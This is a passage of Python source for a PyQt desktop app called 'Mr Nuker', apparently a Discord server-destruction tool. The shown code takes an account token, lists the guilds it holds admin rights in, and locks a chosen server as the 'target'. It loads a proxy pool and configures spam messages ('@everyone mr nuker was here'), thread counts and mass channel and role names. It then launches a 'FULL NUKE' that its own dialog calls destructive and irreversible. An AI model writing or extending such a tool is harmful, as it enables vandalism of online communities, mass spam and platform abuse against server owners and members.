            f"color:{P['red']}; font-size:10px; font-weight:700;")
        self.btn_connect.setText("CONNECT")
        self.btn_connect.setEnabled(True)
        self.sig.log.emit("Token validation failed", LEVEL_ERR)
        self._toast("AUTH FAILED", P["red"])

    # ───────────────────────────────────────────────
    def _refresh_servers(self):
        if not _state["TOKEN"]:
            return
        self.cmb_server.setEnabled(False)
        threading.Thread(target=self._refresh_bg, daemon=True).start()

    def _refresh_bg(self):
        try:
            r = requests.get(f"{BASE}/users/@me/guilds",
                             headers={"Authorization": _state["TOKEN"], "User-Agent": UA},
                             timeout=10)
            guilds = r.json() if r.status_code == 200 else []
        except Exception:
            guilds = []
        self.sig.guilds_loaded.emit(guilds)

    def _servers_loaded(self, guilds):
        self.cmb_server.blockSignals(True)
        self.cmb_server.clear()
        if not guilds:
            self.cmb_server.addItem("(no servers)", None)
            self.cmb_server.blockSignals(False)
            self.cmb_server.setEnabled(True)
            self.sig.log.emit("No servers available", LEVEL_WARN)
            return
        self.cmb_server.addItem(f"select server  ({len(guilds)})", None)
        for g in guilds:
            perms = int(g.get("permissions", 0))
            admin = g.get("owner", False) or bool(perms & 0x8)
            mark = "★  " if admin else "    "
            self.cmb_server.addItem(f"{mark}{g.get('name','?')}   ({g['id']})", g["id"])
        self.cmb_server.blockSignals(False)
        self.cmb_server.setEnabled(True)
        self.sig.log.emit(f"{len(guilds)} servers loaded", LEVEL_OK)

    def _on_server_changed(self, idx):
        gid = self.cmb_server.itemData(idx)
        if gid:
            _state["GUILD_ID"] = gid
            self.sig.log.emit(f"Target → {gid}", LEVEL_OK)
            self._toast("TARGET LOCKED", P["cyan"])

    def _use_manual_id(self):
        gid = self.in_manual.text().strip().strip("\u200b\u200c\u200d\ufeff\u00a0\u2060")
        if gid.isdigit() and 17 <= len(gid) <= 20:
            _state["GUILD_ID"] = gid
            self.in_manual.clear()
            self.sig.log.emit(f"Target → {gid}", LEVEL_OK)
            self._toast("TARGET LOCKED", P["cyan"])
        else:
            self.sig.log.emit("Guild ID must be 17–20 digits", LEVEL_ERR)

    def _on_proxy_toggle(self, checked):
        global PROXY_ENABLED, PROXIES
        PROXY_ENABLED = checked
        if checked:
            if os.path.exists("proxies_cache.txt"):
                with open("proxies_cache.txt") as f:
                    lines = [l.strip() for l in f if l.strip()]
                if lines:
                    PROXIES = lines
                    self.sig.log.emit(f"{len(lines)} proxies loaded", LEVEL_OK)
                    return
            self.sig.log.emit("no proxies_cache.txt — direct", LEVEL_WARN)
        else:
            self.sig.log.emit("proxy pool disabled", LEVEL_SYS)

    # ───────────────────────────────────────────────
    def _apply_config(self):
        global CHANNEL_COUNT, CHANNEL_NAME, ROLE_NAME, SPAM_MESSAGE, SPAM_THREADS, SPAM_COUNT
        CHANNEL_NAME  = _sanitize(self.in_channel.text() or "mr-nuked")
        ROLE_NAME     = self.in_role.text() or "mr-nuked"
        SPAM_MESSAGE  = self.in_msg.text() or "@everyone mr nuker was here"
        CHANNEL_COUNT = self.spin_count.value()
        SPAM_COUNT    = self.spin_spam.value()
        SPAM_THREADS  = self.spin_threads.value()

    def _set_busy(self, busy):
        self._busy = busy
        for b in self._action_buttons:
            b.setEnabled(not busy)
        self.btn_nuke.setEnabled(not busy)
        self.stop_btn.setEnabled(busy)

    def _run_action(self, name, fn):
        if self._busy:
            return
        if not _state["TOKEN"]:
            self._toast("LINK REQUIRED", P["red"]); return
        if not _state["GUILD_ID"]:
            self._toast("SELECT A SERVER", P["red"]); return

        self._apply_config()
        _STOP.clear()
        self._set_busy(True)
        self.set_state("RUNNING")
        self.sig.log.emit(f"▶ {name}", LEVEL_SYS)

        cx, cy = self.frame.width() * 0.27, self.frame.height() * 0.32
        self.particles.burst(cx, cy)
        self._toast(name, P["cyan"])

        self._action_thread = threading.Thread(
            target=self._action_bg, args=(name, fn), daemon=True)
        self._action_thread.start()

    def _action_bg(self, name, fn):
        global _LOG_HANDLER
        _LOG_HANDLER = self._log_bridge
        ok = True
        try:
            fn()
        except Exception as e:
            self._log_bridge("ERR", f"{type(e).__name__}: {e}")
            ok = False
        finally:
            _LOG_HANDLER = None
        self.sig.done.emit(name, ok)

    def _on_action_done(self, name, ok):
        self._set_busy(False)
        self.set_state("READY")
        if ok:
            self.sig.log.emit(f"✓ {name} finished", LEVEL_OK)
            self._toast("COMPLETE", P["green"])
        else:
            self.sig.log.emit(f"✕ {name} failed", LEVEL_ERR)
            self._toast("FAILED", P["red"])

    def _confirm_nuke(self):
        if self._busy:
            return
        if not _state["TOKEN"] or not _state["GUILD_ID"]:
            self._toast("LINK + TARGET REQUIRED", P["red"]); return
        r = QMessageBox.question(
            self, "Full Nuke",
            "Run FULL NUKE on this server?\n\nThis is destructive and irreversible.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No,
        )
        if r == QMessageBox.StandardButton.Yes:
            self._run_action("FULL NUKE", full_nuke)

    def _abort(self):
        _STOP.set()
        self.sig.log.emit("Abort requested", LEVEL_WARN)
        self._toast("ABORTING", P["red"])
        self.set_state("STOPPED")

    # ───────────────────────────────────────────────
    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        g = self.frame.geometry()
        r = QRectF(g).adjusted(1, 1, -1, -1)
        for i in range(5, 0, -1):
            col = QColor(47, 125, 255)
            col.setAlpha(9 + (5 - i) * 6)
            p.setPen(QPen(col, i * 2.0))
            p.setBrush(Qt.BrushStyle.NoBrush)
            p.drawRoundedRect(r.adjusted(-i, -i, i, i + 2), 22 + i, 22 + i)
        p.end()

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self.backdrop.setGeometry(self.frame.rect())
        self.particles.setGeometry(self.frame.rect())
        if hasattr(self, "boot"):
            self.boot.setGeometry(self.frame.rect())

    # ── frameless drag + edge resize ─────────────────
    def _edge_at(self, pos):
        w, h = self.width(), self.height()
        m = self.EDGE
        x, y = pos.x(), pos.y()
        left, right = x <= m, x >= w - m
        top, bottom = y <= m, y >= h - m
        if top and left: return "tl"
        if top and right: return "tr"
        if bottom and left: return "bl"
        if bottom and right: return "br"
        if left: return "l"
        if right: return "r"
        if top: return "t"
        if bottom: return "b"
        return None

    def mousePressEvent(self, event):
        if event.button() != Qt.MouseButton.LeftButton:
            return
        pos = event.position().toPoint()
        edge = self._edge_at(pos)
        if edge:
            self._resize_edge = edge
            self._start_geo = self.geometry()
            self._start_pos = event.globalPosition().toPoint()
            event.accept()
            return
        if pos.y() < 66:
            self._drag = event.globalPosition().toPoint() - self.frameGeometry().topLeft()
            event.accept()

    def mouseMoveEvent(self, event):
        pos = event.position().toPoint()
        if self._resize_edge and self._start_geo and self._start_pos:
            gp = event.globalPosition().toPoint()
            dx = gp.x() - self._start_pos.x()
            dy = gp.y() - self._start_pos.y()
            g = QRect(self._start_geo)
            e = self._resize_edge
            if "l" in e: g.setLeft(g.left() + dx)
            if "r" in e: g.setRight(g.right() + dx)
            if "t" in e: g.setTop(g.top() + dy)
            if "b" in e: g.setBottom(g.bottom() + dy)
            if g.width() >= self.minimumWidth() and g.height() >= self.minimumHeight():
                self.setGeometry(g)
            event.accept()
            return
        if self._drag is not None and event.buttons() & Qt.MouseButton.LeftButton:
            self.move(event.globalPosition().toPoint() - self._drag)
            event.accept()
            return
        edge = self._edge_at(pos)
        cursors = {
            "l": Qt.CursorShape.SizeHorCursor, "r": Qt.CursorShape.SizeHorCursor,
            "t": Qt.CursorShape.SizeVerCursor, "b": Qt.CursorShape.SizeVerCursor,
            "tl": Qt.CursorShape.SizeFDiagCursor, "br": Qt.CursorShape.SizeFDiagCursor,
            "tr": Qt.CursorShape.SizeBDiagCursor, "bl": Qt.CursorShape.SizeBDiagCursor,
        }
        self.setCursor(cursors.get(edge, Qt.CursorShape.ArrowCursor))

    def mouseReleaseEvent(self, event):
        self._drag = None
        self._resize_edge = None
        self._start_geo = None
        self._start_pos = None

    def keyPressEvent(self, event):
        if event.key() == Qt.Key.Key_Escape:
            self.close()
        else:
            super().keyPressEvent(event)


# ─────────────────────────────────────────────────────────────
#  ENTRY
# ─────────────────────────────────────────────────────────────
def main():
    app = QApplication(sys.argv)
    app.setApplicationName("Mr Nuker")
    app.setStyle("Fusion")
    win = NukerWindow()
    win.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()